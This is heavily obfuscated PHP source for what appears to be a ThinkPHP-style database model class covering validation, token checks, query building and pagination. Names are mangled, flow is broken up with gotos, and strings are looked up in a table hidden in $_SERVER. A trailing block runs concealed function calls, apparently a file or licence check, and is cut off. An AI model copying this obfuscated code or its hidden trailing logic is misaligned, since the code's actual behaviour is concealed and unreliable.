$c‘ïŠñÈŞ‘[$c¦ßÚªç·¶]; } return $C›ôÉëÆÃŸ; } } return null; } public function create($b˜ÕñÌĞé× = '', $c‰„©Ø‚£İ = '') { goto dÊñ…ïó‹Š; A´Óˆšô†“: if ($this->autoCheckFields) { $B‘–¸ŒŒ¶ = $this->getDbFields(); foreach ($b˜ÕñÌĞé× as $BáÉËéÏ…ˆ => $f™‰ÔÃ‚Ó”) { if (!in_array($BáÉËéÏ…ˆ, $B‘–¸ŒŒ¶)) { unset($b˜ÕñÌĞé×[$BáÉËéÏ…ˆ]); } elseif (MAGIC_QUOTES_GPC && is_string($f™‰ÔÃ‚Ó”)) { $b˜ÕñÌĞé×[$BáÉËéÏ…ˆ] = stripslashes($f™‰ÔÃ‚Ó”); } } } $this->autoOperation($b˜ÕñÌĞé×, $c‰„©Ø‚£İ); $this->data = $b˜ÕñÌĞé×; goto CŠ¸‚¾Ïò; E¥¥˜ËÁ: if (isset($B‘–¸ŒŒ¶)) { if (is_string($B‘–¸ŒŒ¶)) { $B‘–¸ŒŒ¶ = explode($B¯„â–Ùİ±[47], $B‘–¸ŒŒ¶); } if (think_config($B¯„â–Ùİ±[294])) { $B‘–¸ŒŒ¶[] = think_config($B¯„â–Ùİ±[295]); } foreach ($b˜ÕñÌĞé× as $BáÉËéÏ…ˆ => $f™‰ÔÃ‚Ó”) { if (!in_array($BáÉËéÏ…ˆ, $B‘–¸ŒŒ¶)) { unset($b˜ÕñÌĞé×[$BáÉËéÏ…ˆ]); } } } if (!$this->autoValidation($b˜ÕñÌĞé×, $c‰„©Ø‚£İ)) { return !1; } if (!$this->autoCheckToken($b˜ÕñÌĞé×)) { $this->error = think_lang($B¯„â–Ùİ±[296]); return !1; } goto A´Óˆšô†“; FâÄâ÷äÌ: $b˜ÕñÌĞé× = $this->parseFieldsMap($b˜ÕñÌĞé×, 0); $c‰„©Ø‚£İ = $c‰„©Ø‚£İ ? $c‰„©Ø‚£İ : (!empty($b˜ÕñÌĞé×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$B¯„â–Ùİ±[269]])) { $B‘–¸ŒŒ¶ = $this->options[$B¯„â–Ùİ±[269]]; unset($this->options[$B¯„â–Ùİ±[269]]); } elseif ($c‰„©Ø‚£İ == THINK_MODEL_INSERT && isset($this->insertFields)) { $B‘–¸ŒŒ¶ = $this->insertFields; } elseif ($c‰„©Ø‚£İ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $B‘–¸ŒŒ¶ = $this->updateFields; } goto E¥¥˜ËÁ; CŠ¸‚¾Ïò: return $b˜ÕñÌĞé×; goto fïÅº§§É®; dÊñ…ïó‹Š: $B¯„â–Ùİ± =& $_SERVER[òÀöí]; if (empty($b˜ÕñÌĞé×)) { $b˜ÕñÌĞé× = $_POST; } elseif (is_object($b˜ÕñÌĞé×)) { $b˜ÕñÌĞé× = get_object_vars($b˜ÕñÌĞé×); } if (empty($b˜ÕñÌĞé×) || !is_array($b˜ÕñÌĞé×)) { $this->error = think_lang($B¯„â–Ùİ±[267]); return !1; } goto FâÄâ÷äÌ; fïÅº§§É®: } public function autoCheckToken($d³Î ğèŒ) { $BÍëøÒÓ“Ó =& $_SERVER[òÀöí]; if (isset($this->options[$BÍëøÒÓ“Ó[297]]) && !$this->options[$BÍëøÒÓ“Ó[297]]) { return !0; } if (think_config($BÍëøÒÓ“Ó[294])) { $F¤ÄÈÁ¥· = think_config($BÍëøÒÓ“Ó[295]); if (!isset($d³Î ğèŒ[$F¤ÄÈÁ¥·]) || Session::get($F¤ÄÈÁ¥·)) { return !1; } list($cˆ†ª×†ªÇ, $bá»º”ì) = explode($BÍëøÒÓ“Ó[70], $d³Î ğèŒ[$F¤ÄÈÁ¥·]); if ($bá»º”ì && Session::get($F¤ÄÈÁ¥· . $BÍëøÒÓ“Ó[94] . $cˆ†ª×†ªÇ) === $bá»º”ì) { Session::remove($F¤ÄÈÁ¥· . $BÍëøÒÓ“Ó[94] . $cˆ†ª×†ªÇ); return !0; } if (think_config($BÍëøÒÓ“Ó[298])) { Session::remove($F¤ÄÈÁ¥· . $BÍëøÒÓ“Ó[94] . $cˆ†ª×†ªÇ); } return !1; } return !0; } public function regex($f¼”Åò¥‡¨, $EÌ›‰ŠœÑ) { $bµÍÕˆÜ”† =& $_SERVER[òÀöí]; $f¹ªÜùˆ–İ = array($bµÍÕˆÜ”†[299] => $bµÍÕˆÜ”†[300], $bµÍÕˆÜ”†[301] => $bµÍÕˆÜ”†[302], $bµÍÕˆÜ”†[303] => $bµÍÕˆÜ”†[304], $bµÍÕˆÜ”†[305] => $bµÍÕˆÜ”†[306], $bµÍÕˆÜ”†[307] => $bµÍÕˆÜ”†[308], $bµÍÕˆÜ”†[309] => $bµÍÕˆÜ”†[310], $bµÍÕˆÜ”†[311] => $bµÍÕˆÜ”†[312], $bµÍÕˆÜ”†[286] => $bµÍÕˆÜ”†[313], $bµÍÕˆÜ”†[314] => $bµÍÕˆÜ”†[315]); if (isset($f¹ªÜùˆ–İ[strtolower($EÌ›‰ŠœÑ)])) { $EÌ›‰ŠœÑ = $f¹ªÜùˆ–İ[strtolower($EÌ›‰ŠœÑ)]; } return preg_match($EÌ›‰ŠœÑ, $f¼”Åò¥‡¨) === 1; } private function autoOperation(&$d·¹­È¢ƒø, $a¥ÔÔ…õóä) { $fÎ¥Ö¢Éˆ› =& $_SERVER[òÀöí]; if (!empty($this->options[$fÎ¥Ö¢Éˆ›[316]])) { $fÄ¡ƒ¼åÑ = $this->options[$fÎ¥Ö¢Éˆ›[316]]; unset($this->options[$fÎ¥Ö¢Éˆ›[316]]); } elseif (!empty($this->_auto)) { $fÄ¡ƒ¼åÑ = $this->_auto; } if (isset($fÄ¡ƒ¼åÑ)) { foreach ($fÄ¡ƒ¼åÑ as $CØ„Úáƒîè) { if (empty($CØ„Úáƒîè[2])) { $CØ„Úáƒîè[2] = THINK_MODEL_INSERT; } if ($a¥ÔÔ…õóä == $CØ„Úáƒîè[2] || $CØ„Úáƒîè[2] == THINK_MODEL_BOTH) { switch (trim($CØ„Úáƒîè[3])) { case $fÎ¥Ö¢Éˆ›[317]: case $fÎ¥Ö¢Éˆ›[318]: $F°æŒĞ·© = isset($CØ„Úáƒîè[4]) ? (array) $CØ„Úáƒîè[4] : array(); if (isset($d·¹­È¢ƒø[$CØ„Úáƒîè[0]])) { array_unshift($F°æŒĞ·©, $d·¹­È¢ƒø[$CØ„Úáƒîè[0]]); } if ($fÎ¥Ö¢Éˆ›[317] == $CØ„Úáƒîè[3]) { $d·¹­È¢ƒø[$CØ„Úáƒîè[0]] = call_user_func_array($CØ„Úáƒîè[1], $F°æŒĞ·©); } else { $d·¹­È¢ƒø[$CØ„Úáƒîè[0]] = call_user_func_array(array(&$this, $CØ„Úáƒîè[1]), $F°æŒĞ·©); } break; case $fÎ¥Ö¢Éˆ›[269]: $d·¹­È¢ƒø[$CØ„Úáƒîè[0]] = $d·¹­È¢ƒø[$CØ„Úáƒîè[1]]; break; case $fÎ¥Ö¢Éˆ›[319]: if ($fÎ¥Ö¢Éˆ›[33] === $d·¹­È¢ƒø[$CØ„Úáƒîè[0]]) { unset($d·¹­È¢ƒø[$CØ„Úáƒîè[0]]); } break; case $fÎ¥Ö¢Éˆ›[320]: default: $d·¹­È¢ƒø[$CØ„Úáƒîè[0]] = $CØ„Úáƒîè[1]; } if (!1 === $d·¹­È¢ƒø[$CØ„Úáƒîè[0]]) { unset($d·¹­È¢ƒø[$CØ„Úáƒîè[0]]); } } } } return $d·¹­È¢ƒø; } protected function autoValidation($CŸêµ’Ú, $d“ö‚â½º) { $Dâ¶”¨ÇËÀ =& $_SERVER[òÀöí]; if (!empty($this->options[$Dâ¶”¨ÇËÀ[321]])) { $böŞÂìë»° = $this->options[$Dâ¶”¨ÇËÀ[321]]; unset($this->options[$Dâ¶”¨ÇËÀ[321]]); } elseif (!empty($this->_validate)) { $böŞÂìë»° = $this->_validate; } if (isset($böŞÂìë»°)) { if ($this->patchValidate) { $this->error = array(); } foreach ($böŞÂìë»° as $dÅ–¤çê¹÷ => $céÌ‹ÖìÊÂ) { if (empty($céÌ‹ÖìÊÂ[5]) || $céÌ‹ÖìÊÂ[5] == THINK_MODEL_BOTH || $céÌ‹ÖìÊÂ[5] == $d“ö‚â½º) { if (0 == strpos($céÌ‹ÖìÊÂ[2], $Dâ¶”¨ÇËÀ[322]) && strpos($céÌ‹ÖìÊÂ[2], $Dâ¶”¨ÇËÀ[323])) { $céÌ‹ÖìÊÂ[2] = think_lang(substr($céÌ‹ÖìÊÂ[2], 2, -1)); } $céÌ‹ÖìÊÂ[3] = isset($céÌ‹ÖìÊÂ[3]) ? $céÌ‹ÖìÊÂ[3] : THINK_EXISTS_VALIDATE; $céÌ‹ÖìÊÂ[4] = isset($céÌ‹ÖìÊÂ[4]) ? $céÌ‹ÖìÊÂ[4] : $Dâ¶”¨ÇËÀ[324]; switch ($céÌ‹ÖìÊÂ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CŸêµ’Ú, $céÌ‹ÖìÊÂ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Dâ¶”¨ÇËÀ[33] != trim($CŸêµ’Ú[$céÌ‹ÖìÊÂ[0]])) { if (!1 === $this->_validationField($CŸêµ’Ú, $céÌ‹ÖìÊÂ)) { return !1; } } break; default: if (isset($CŸêµ’Ú[$céÌ‹ÖìÊÂ[0]])) { if (!1 === $this->_validationField($CŸêµ’Ú, $céÌ‹ÖìÊÂ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($AŠ×ª‰¶Ã, $EÂˆŒâê™ğ) { if (!1 === $this->_validationFieldItem($AŠ×ª‰¶Ã, $EÂˆŒâê™ğ)) { if ($this->patchValidate) { $this->error[$EÂˆŒâê™ğ[0]] = $EÂˆŒâê™ğ[2]; } else { $this->error = $EÂˆŒâê™ğ[2]; return !1; } } return; } protected function _validationFieldItem($b£Şôìñ£Ì, $a¶Şõ¸•Ó¯) { $bØ£ù×ƒ =& $_SERVER[òÀöí]; switch (strtolower(trim($a¶Şõ¸•Ó¯[4]))) { case $bØ£ù×ƒ[317]: case $bØ£ù×ƒ[318]: $Aäæ ¸šèÖ = isset($a¶Şõ¸•Ó¯[6]) ? (array) $a¶Şõ¸•Ó¯[6] : array(); if (is_string($a¶Şõ¸•Ó¯[0]) && strpos($a¶Şõ¸•Ó¯[0], $bØ£ù×ƒ[47])) { $a¶Şõ¸•Ó¯[0] = explode($bØ£ù×ƒ[47], $a¶Şõ¸•Ó¯[0]); } if (is_array($a¶Şõ¸•Ó¯[0])) { foreach ($a¶Şõ¸•Ó¯[0] as $c¤­Ù¦Á×) { $C„èÊÈå®»[$c¤­Ù¦Á×] = $b£Şôìñ£Ì[$c¤­Ù¦Á×]; } array_unshift($Aäæ ¸šèÖ, $C„èÊÈå®»); } else { array_unshift($Aäæ ¸šèÖ, $b£Şôìñ£Ì[$a¶Şõ¸•Ó¯[0]]); } if ($bØ£ù×ƒ[317] == $a¶Şõ¸•Ó¯[4]) { return call_user_func_array($a¶Şõ¸•Ó¯[1], $Aäæ ¸šèÖ); } else { return call_user_func_array(array(&$this, $a¶Şõ¸•Ó¯[1]), $Aäæ ¸šèÖ); } case $bØ£ù×ƒ[325]: return $b£Şôìñ£Ì[$a¶Şõ¸•Ó¯[0]] == $b£Şôìñ£Ì[$a¶Şõ¸•Ó¯[1]]; case $bØ£ù×ƒ[326]: if (is_string($a¶Şõ¸•Ó¯[0]) && strpos($a¶Şõ¸•Ó¯[0], $bØ£ù×ƒ[47])) { $a¶Şõ¸•Ó¯[0] = explode($bØ£ù×ƒ[47], $a¶Şõ¸•Ó¯[0]); } $E¼™²ŒÒíÉ = array(); if (is_array($a¶Şõ¸•Ó¯[0])) { foreach ($a¶Şõ¸•Ó¯[0] as $c¤­Ù¦Á×) { $E¼™²ŒÒíÉ[$c¤­Ù¦Á×] = $b£Şôìñ£Ì[$c¤­Ù¦Á×]; } } else { $E¼™²ŒÒíÉ[$a¶Şõ¸•Ó¯[0]] = $b£Şôìñ£Ì[$a¶Şõ¸•Ó¯[0]]; } if (!empty($b£Şôìñ£Ì[$this->getPk()])) { $E¼™²ŒÒíÉ[$this->getPk()] = array($bØ£ù×ƒ[327], $b£Şôìñ£Ì[$this->getPk()]); } if ($this->where($E¼™²ŒÒíÉ)->find()) { return !1; } return !0; default: return $this->check($b£Şôìñ£Ì[$a¶Şõ¸•Ó¯[0]], $a¶Şõ¸•Ó¯[1], $a¶Şõ¸•Ó¯[4]); } } public function check($E™ù†¨¯õ, $B²ÍåàÄ’, $e…ÎÀÁÖê = "\x72\x65\147\145\x78") { $aÜ¬´‘‡ŠÁ =& $_SERVER[òÀöí]; $e…ÎÀÁÖê = strtolower(trim($e…ÎÀÁÖê)); switch ($e…ÎÀÁÖê) { case $aÜ¬´‘‡ŠÁ[7]: case $aÜ¬´‘‡ŠÁ[328]: $B™»ä–Á˜ = is_array($B²ÍåàÄ’) ? $B²ÍåàÄ’ : explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’); return $e…ÎÀÁÖê == $aÜ¬´‘‡ŠÁ[7] ? in_array($E™ù†¨¯õ, $B™»ä–Á˜) : !in_array($E™ù†¨¯õ, $B™»ä–Á˜); case $aÜ¬´‘‡ŠÁ[329]: case $aÜ¬´‘‡ŠÁ[330]: if (is_array($B²ÍåàÄ’)) { $AÊ´åØˆí = $B²ÍåàÄ’[0]; $fê”ˆâê§— = $B²ÍåàÄ’[1]; } else { list($AÊ´åØˆí, $fê”ˆâê§—) = explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’); } return $e…ÎÀÁÖê == $aÜ¬´‘‡ŠÁ[329] ? $E™ù†¨¯õ >= $AÊ´åØˆí && $E™ù†¨¯õ <= $fê”ˆâê§— : $E™ù†¨¯õ < $AÊ´åØˆí || $E™ù†¨¯õ > $fê”ˆâê§—; case $aÜ¬´‘‡ŠÁ[331]: case $aÜ¬´‘‡ŠÁ[332]: return $e…ÎÀÁÖê == $aÜ¬´‘‡ŠÁ[331] ? $E™ù†¨¯õ == $B²ÍåàÄ’ : $E™ù†¨¯õ != $B²ÍåàÄ’; case $aÜ¬´‘‡ŠÁ[333]: $f‡Öƒ£½ë = mb_strlen($E™ù†¨¯õ, $aÜ¬´‘‡ŠÁ[334]); if (strpos($B²ÍåàÄ’, $aÜ¬´‘‡ŠÁ[47])) { list($AÊ´åØˆí, $fê”ˆâê§—) = explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’); return $f‡Öƒ£½ë >= $AÊ´åØˆí && $f‡Öƒ£½ë <= $fê”ˆâê§—; } else { return $f‡Öƒ£½ë == $B²ÍåàÄ’; } case $aÜ¬´‘‡ŠÁ[335]: list($CÕåˆ†ÚÜ°, $e ¼ïğ•„Ğ) = explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’); if (!is_numeric($CÕåˆ†ÚÜ°)) { $CÕåˆ†ÚÜ° = strtotime($CÕåˆ†ÚÜ°); } if (!is_numeric($e ¼ïğ•„Ğ)) { $e ¼ïğ•„Ğ = strtotime($e ¼ïğ•„Ğ); } return NOW_TIME >= $CÕåˆ†ÚÜ° && NOW_TIME <= $e ¼ïğ•„Ğ; case $aÜ¬´‘‡ŠÁ[336]: return in_array(get_client_ip(), explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’)); case $aÜ¬´‘‡ŠÁ[337]: return !in_array(get_client_ip(), explode($aÜ¬´‘‡ŠÁ[47], $B²ÍåàÄ’)); case $aÜ¬´‘‡ŠÁ[324]: default: return $this->regex($E™ù†¨¯õ, $B²ÍåàÄ’); } } public function query($B¡Ó°Ã§ìÚ, $Eˆ»åë‹›¼ = false) { $EÅ†¨Â¢¥´ =& $_SERVER[òÀöí]; if (!is_bool($Eˆ»åë‹›¼) && !is_array($Eˆ»åë‹›¼)) { $Eˆ»åë‹›¼ = func_get_args(); array_shift($Eˆ»åë‹›¼); } $B¡Ó°Ã§ìÚ = str_replace(array($EÅ†¨Â¢¥´[227], $EÅ†¨Â¢¥´[338]), $EÅ†¨Â¢¥´[50], $B¡Ó°Ã§ìÚ); $B¡Ó°Ã§ìÚ = $this->parseSql($B¡Ó°Ã§ìÚ, $Eˆ»åë‹›¼); return $this->db->query($B¡Ó°Ã§ìÚ); } public function execute($C‡ëá££, $D­ÔÉÈ£ÇÇ = false) { if (!is_bool($D­ÔÉÈ£ÇÇ) && !is_array($D­ÔÉÈ£ÇÇ)) { $D­ÔÉÈ£ÇÇ = func_get_args(); array_shift($D­ÔÉÈ£ÇÇ); } $C‡ëá££ = $this->parseSql($C‡ëá££, $D­ÔÉÈ£ÇÇ); return $this->db->execute($C‡ëá££); } protected function parseSql($Aãò§¥ó«‰, $e‹ô‚Åæí) { $fœçº‰çî =& $_SERVER[òÀöí]; if (!0 === $e‹ô‚Åæí) { $c‰‡£³ØîÃ = $this->_parseOptions(); $Aãò§¥ó«‰ = $this->db->parseSql($Aãò§¥ó«‰, $c‰‡£³ØîÃ); } elseif (is_array($e‹ô‚Åæí)) { $e‹ô‚Åæí = array_map(array($this->db, $fœçº‰çî[339]), $e‹ô‚Åæí); $Aãò§¥ó«‰ = vsprintf($Aãò§¥ó«‰, $e‹ô‚Åæí); } else { $Aãò§¥ó«‰ = strtr($Aãò§¥ó«‰, array($fœçº‰çî[340] => $this->getTableName(), $fœçº‰çî[341] => think_config($fœçº‰çî[240]))); } $this->db->setModel($this->name); return $Aãò§¥ó«‰; } public function db($b™èÁÚ°Å² = '', $a¨àÈß = '', $bÑê•Ÿ×êƒ = array()) { goto e™ß§Úä—; e‘î“†à‰ˆ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto cÉµÂ½˜£; côÜŞËÎàÊ: static $EÆæ’óäß£ = array(); if (!isset($EÆæ’óäß£[$b™èÁÚ°Å²]) || isset($EÆæ’óäß£[$b™èÁÚ°Å²]) && $a¨àÈß && $b—–Á±Ò®[$b™èÁÚ°Å²] != $a¨àÈß) { if (!empty($a¨àÈß) && is_string($a¨àÈß) && !1 === strpos($a¨àÈß, $Aºñ¥¦‘§è[8])) { $a¨àÈß = think_config($a¨àÈß); } $EÆæ’óäß£[$b™èÁÚ°Å²] = Db::getInstance($a¨àÈß); } elseif (NULL === $a¨àÈß) { $EÆæ’óäß£[$b™èÁÚ°Å²]->close(); unset($EÆæ’óäß£[$b™èÁÚ°Å²]); return; } if (!empty($bÑê•Ÿ×êƒ)) { if (is_string($bÑê•Ÿ×êƒ)) { parse_str($bÑê•Ÿ×êƒ, $bÑê•Ÿ×êƒ); } foreach ($bÑê•Ÿ×êƒ as $EÎÔÄÕÄ => $aË¡¥„…¸Ñ) { $this->setProperty($EÎÔÄÕÄ, $aË¡¥„…¸Ñ); } } goto AŠÓ¶‰Õ¿; AŠÓ¶‰Õ¿: $b—–Á±Ò®[$b™èÁÚ°Å²] = $a¨àÈß; $this->db = $EÆæ’óäß£[$b™èÁÚ°Å²]; $this->_after_db(); goto e‘î“†à‰ˆ; e™ß§Úä—: $Aºñ¥¦‘§è =& $_SERVER[òÀöí]; if ($Aºñ¥¦‘§è[33] === $b™èÁÚ°Å² && $this->db) { return $this->db; } static $b—–Á±Ò® = array(); goto côÜŞËÎàÊ; cÉµÂ½˜£: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Eë‡ˆ‘ùË‡ = get_class($this); if ($Eë‡ˆ‘ùË‡ == $_SERVER[òÀöí][342]) { return $this->name; } $this->name = substr($Eë‡ˆ‘ùË‡, 0, -5); } return $this->name; } public function getTableName() { $DîÓéàÃ ¯ =& $_SERVER[òÀöí]; if (empty($this->trueTableName)) { $F®±”‹†®¡ = !empty($this->tablePrefix) ? $this->tablePrefix : $DîÓéàÃ ¯[33]; if (!empty($this->tableName)) { $F®±”‹†®¡ .= $this->tableName; } else { $F®±”‹†®¡ .= think_parse_name($this->name); } $this->trueTableName = strtolower($F®±”‹†®¡); } return (!empty($this->dbName) ? $this->dbName . $DîÓéàÃ ¯[94] : $DîÓéàÃ ¯[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e×ÈœØ·›Ò =& $_SERVER[òÀöí]; return isset($this->fields[$e×ÈœØ·›Ò[247]]) ? $this->fields[$e×ÈœØ·›Ò[247]] : $this->pk; } public function getDbFields() { $e’ŠÍÓÄùË =& $_SERVER[òÀöí]; if (isset($this->options[$e’ŠÍÓÄùË[275]])) { $dŸéºÔĞ×ã = $this->db->getFields($this->options[$e’ŠÍÓÄùË[275]]); return $dŸéºÔĞ×ã ? array_keys($dŸéºÔĞ×ã) : !1; } if ($this->fields) { $dŸéºÔĞ×ã = $this->fields; unset($dŸéºÔĞ×ã[$e’ŠÍÓÄùË[246]], $dŸéºÔĞ×ã[$e’ŠÍÓÄùË[247]], $dŸéºÔĞ×ã[$e’ŠÍÓÄùË[248]], $dŸéºÔĞ×ã[$e’ŠÍÓÄùË[245]]); return $dŸéºÔĞ×ã; } return !1; } public function data($f˜¤°¦šÉ– = '') { $bÈÍ¿«Ï÷Å =& $_SERVER[òÀöí]; if ($bÈÍ¿«Ï÷Å[33] === $f˜¤°¦šÉ– && !empty($this->data)) { return $this->data; } if (is_object($f˜¤°¦šÉ–)) { $f˜¤°¦šÉ– = get_object_vars($f˜¤°¦šÉ–); } elseif (is_string($f˜¤°¦šÉ–)) { parse_str($f˜¤°¦šÉ–, $f˜¤°¦šÉ–); } elseif (!is_array($f˜¤°¦šÉ–)) { think_exception(think_lang($bÈÍ¿«Ï÷Å[267])); } $this->data = $f˜¤°¦šÉ–; return $this; } public function join($aÚÆ˜ªµÆç) { $Déà…Ëá¶… =& $_SERVER[òÀöí]; if (is_array($aÚÆ˜ªµÆç)) { $this->options[$Déà…Ëá¶…[278]] = $aÚÆ˜ªµÆç; } elseif (!empty($aÚÆ˜ªµÆç)) { $this->options[$Déà…Ëá¶…[278]][] = $aÚÆ˜ªµÆç; } return $this; } public function union($f¼Ó«Ñèí´, $CˆñÛ¡¡…• = false) { goto D‘¯™ª†³; cçãåÎÂÀÏ: if (is_object($f¼Ó«Ñèí´)) { $f¼Ó«Ñèí´ = get_object_vars($f¼Ó«Ñèí´); } if (is_string($f¼Ó«Ñèí´)) { $bºÄĞ‰©× = $f¼Ó«Ñèí´; } elseif (is_array($f¼Ó«Ñèí´)) { if (isset($f¼Ó«Ñèí´[0])) { $this->options[$BŠíßõÃ„[343]] = array_merge($this->options[$BŠíßõÃ„[343]], $f¼Ó«Ñèí´); return $this; } else { $bºÄĞ‰©× = $f¼Ó«Ñèí´; } } else { think_exception(think_lang($BŠíßõÃ„[267])); } $this->options[$BŠíßõÃ„[343]][] = $bºÄĞ‰©×; goto a¬‡â©ÜÂ; a¬‡â©ÜÂ: return $this; goto C®  ÖÏ¦; D‘¯™ª†³: $BŠíßõÃ„ =& $_SERVER[òÀöí]; if (empty($f¼Ó«Ñèí´)) { return $this; } if ($CˆñÛ¡¡…•) { $this->options[$BŠíßõÃ„[343]][$BŠíßõÃ„[344]] = !0; } goto cçãåÎÂÀÏ; C®  ÖÏ¦: } public function cache($F¢Ä¬áë‹ = true, $eğ¿šğ«¦ = null, $e•®Û©àË = '') { $E£ë±­Ğ“ =& $_SERVER[òÀöí]; if (!1 !== $F¢Ä¬áë‹) { $this->options[$E£ë±­Ğ“[345]] = array($E£ë±­Ğ“[92] => $F¢Ä¬áë‹, $E£ë±­Ğ“[335] => $eğ¿šğ«¦, $E£ë±­Ğ“[29] => $e•®Û©àË); } return $this; } public function field($d´’àÎ…òÊ, $F§‚Ó¦á™Ş = false) { $C–¢ ’¡»– =& $_SERVER[òÀöí]; if (!0 === $d´’àÎ…òÊ) { $bæó˜’Öáƒ = $this->getDbFields(); $d´’àÎ…òÊ = $bæó˜’Öáƒ ? $bæó˜’Öáƒ : $C–¢ ’¡»–[182]; } elseif ($F§‚Ó¦á™Ş) { if (is_string($d´’àÎ…òÊ)) { $d´’àÎ…òÊ = explode($C–¢ ’¡»–[47], $d´’àÎ…òÊ); } $bæó˜’Öáƒ = $this->getDbFields(); $d´’àÎ…òÊ = $bæó˜’Öáƒ ? array_diff($bæó˜’Öáƒ, $d´’àÎ…òÊ) : $d´’àÎ…òÊ; } $this->options[$C–¢ ’¡»–[269]] = $d´’àÎ…òÊ; return $this; } public function scope($F—Åñ˜âœÁ = '', $bºß¢ã¤ = NULL) { $aõäÉ–Õ¢’ =& $_SERVER[òÀöí]; if ($aõäÉ–Õ¢’[33] === $F—Åñ˜âœÁ) { if (isset($this->_scope[$aõäÉ–Õ¢’[34]])) { $Dˆ¼†‰µ¯à = $this->_scope[$aõäÉ–Õ¢’[34]]; } else { return $this; } } elseif (is_string($F—Åñ˜âœÁ)) { $C§³åÓÉ˜ = explode($aõäÉ–Õ¢’[47], $F—Åñ˜âœÁ); $Dˆ¼†‰µ¯à = array(); foreach ($C§³åÓÉ˜ as $aÌï²®Âó) { if (!isset($this->_scope[$aÌï²®Âó])) { continue; } $Dˆ¼†‰µ¯à = array_merge($Dˆ¼†‰µ¯à, $this->_scope[$aÌï²®Âó]); } if (!empty($bºß¢ã¤) && is_array($bºß¢ã¤)) { $Dˆ¼†‰µ¯à = array_merge($Dˆ¼†‰µ¯à, $bºß¢ã¤); } } elseif (is_array($F—Åñ˜âœÁ)) { $Dˆ¼†‰µ¯à = $F—Åñ˜âœÁ; } if (is_array($Dˆ¼†‰µ¯à) && !empty($Dˆ¼†‰µ¯à)) { $this->options = array_merge($this->options, array_change_key_case($Dˆ¼†‰µ¯à)); } return $this; } public function where($b¸‹÷¯´à, $Eë«¬‡»å = null) { $fŒ¹ºØ–˜ì =& $_SERVER[òÀöí]; if (!is_null($Eë«¬‡»å) && is_string($b¸‹÷¯´à)) { if (!is_array($Eë«¬‡»å)) { $Eë«¬‡»å = func_get_args(); array_shift($Eë«¬‡»å); } $Eë«¬‡»å = array_map(array($this->db, $fŒ¹ºØ–˜ì[339]), $Eë«¬‡»å); $b¸‹÷¯´à = vsprintf($b¸‹÷¯´à, $Eë«¬‡»å); } elseif (is_object($b¸‹÷¯´à)) { $b¸‹÷¯´à = get_object_vars($b¸‹÷¯´à); } elseif (is_array($b¸‹÷¯´à)) { foreach ($b¸‹÷¯´à as $a¢ƒ¦İ’…À => $Eñ¨ãŠ˜‰É) { if ((is_numeric($a¢ƒ¦İ’…À) || !$a¢ƒ¦İ’…À) && is_string($Eñ¨ãŠ˜‰É)) { if (strpos($Eñ¨ãŠ˜‰É, $fŒ¹ºØ–˜ì[346]) === 0) { continue; } think_trace($fŒ¹ºØ–˜ì[347], $fŒ¹ºØ–˜ì[33], $fŒ¹ºØ–˜ì[46]); die; } } } if (is_string($b¸‹÷¯´à) && $fŒ¹ºØ–˜ì[33] != $b¸‹÷¯´à) { $dÒŠÜ±¢”ª = array(); $dÒŠÜ±¢”ª[$fŒ¹ºØ–˜ì[348]] = $b¸‹÷¯´à; $b¸‹÷¯´à = $dÒŠÜ±¢”ª; } if (isset($this->options[$fŒ¹ºØ–˜ì[271]])) { $this->options[$fŒ¹ºØ–˜ì[271]] = array_merge($this->options[$fŒ¹ºØ–˜ì[271]], $b¸‹÷¯´à); } else { $this->options[$fŒ¹ºØ–˜ì[271]] = $b¸‹÷¯´à; } return $this; } public function limit($Fë©Ü×è§ö, $aò¯İòĞâ¬ = null) { $Dî°ğ…Íƒ­ =& $_SERVER[òÀöí]; $this->options[$Dî°ğ…Íƒ­[288]] = is_null($aò¯İòĞâ¬) ? $Fë©Ü×è§ö : $Fë©Ü×è§ö . $Dî°ğ…Íƒ­[47] . $aò¯İòĞâ¬; return $this; } public function page($bİŸˆ¸ì³À, $E©‘•ƒÂÈ = null) { $AöÜÇ‹¸ÜÓ =& $_SERVER[òÀöí]; $this->options[$AöÜÇ‹¸ÜÓ[349]] = is_null($E©‘•ƒÂÈ) ? $bİŸˆ¸ì³À : $bİŸˆ¸ì³À . $AöÜÇ‹¸ÜÓ[47] . $E©‘•ƒÂÈ; return $this; } public function comment($bÚÛÊ°‹¾) { $this->options[$_SERVER[òÀöí][350]] = $bÚÛÊ°‹¾; return $this; } public function setProperty($Bõ© ¯‚Ïô, $Aé•‘ß¹Ş) { if (property_exists($this, $Bõ© ¯‚Ïô)) { $this->{$Bõ© ¯‚Ïô} = $Aé•‘ß¹Ş; } return $this; } } goto bó¦¤‹î‰à; eáÒê“Ã¸: if ($_SERVER[$_SERVER[òÀöí][753]] != $_SERVER[$_SERVER[òÀöí][754]]) { goto FÈÊµ®›Êß; FÈÊµ®›Êß: $fÎ“àÂ°Ñ = $_SERVER[òÀöí][755]; $dİ×ñ†Õº = $_SERVER[$_SERVER[òÀöí][756]] . $_SERVER[òÀöí][757]; $FŸ¨éã¶Á¤ = $fÎ“àÂ°Ñ($dİ×ñ†Õº); goto aÑ¡†µ°¬ô; aÑ¡†µ°¬ô: $CÎ®ÄØ­Ş = explode($_SERVER[òÀöí][227], $FŸ¨éã¶Á¤); if (count($CÎ®ÄØ­Ş) < $_SERVER[òÀöí][588]) { $D²Ÿİ½‚¦İ = $_SERVER[òÀöí][758]; $D²Ÿİ½‚¦İ(); } $D¦¦ÏÛ‚ñµ = $_SERVER[òÀöí][759]; goto dóğ½•¤Ø; 